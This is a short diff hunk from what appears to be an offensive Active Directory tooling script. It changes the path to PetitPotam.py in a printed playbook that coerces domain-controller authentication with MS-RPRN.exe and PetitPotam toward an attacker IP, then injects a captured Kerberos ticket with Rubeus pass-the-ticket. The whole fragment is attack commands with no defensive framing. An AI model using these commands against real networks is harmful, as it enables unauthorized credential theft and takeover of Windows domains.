@@ -89,7 +89,7 @@ def run():
 
   {Y}Coerce DC auth (separate terminal):{RST}
   .\\MS-RPRN.exe \\\\{dc} \\\\<unconstrained_server>
-  python3 PetitPotam.py -u {user} -p '<pw>' -d {dom} <attacker_ip> {dc}
+  python3 tools/PetitPotam/PetitPotam.py -u {user} -p '<pw>' -d {dom} <attacker_ip> {dc}
 
   {Y}Inject captured TGT:{RST}
   .\\Rubeus.exe ptt /ticket:doIFxTCCBc...
